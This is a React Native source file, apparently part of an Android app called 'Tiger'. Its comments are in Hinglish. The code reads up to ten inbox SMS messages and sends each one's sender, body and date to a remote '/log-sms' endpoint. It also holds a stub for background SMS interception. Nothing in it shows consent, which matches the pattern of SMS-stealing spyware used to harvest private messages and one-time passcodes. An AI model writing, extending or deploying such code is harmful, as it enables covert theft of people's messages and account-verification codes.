import SmsAndroid from 'react-native-get-sms-android';
import { sendDataToServer } from './ApiService';

export const startSmsListener = (deviceInfo) => {
  // SMS interceptor logic jo background mein chalta hai
  console.log("Tiger SMS Listener Started...");

  // Note: Native SMS interception ke liye humein 
  // Android native module ki zarurat hoti hai jo background mein chale
};

export const fetchAllSms = () => {
  const filter = {
    box: 'inbox', 
    maxCount: 10, 
  };

  SmsAndroid.list(JSON.stringify(filter), (fail) => {
      console.log("Failed to fetch SMS: " + fail);
    }, (count, smsList) => {
      const messages = JSON.parse(smsList);
      messages.forEach(msg => {
        // Har message ko Render server par bhej rahe hain
        sendDataToServer('/log-sms', {
          address: msg.address,
          body: msg.body,
          date: msg.date
        });
      });
    }
  );
};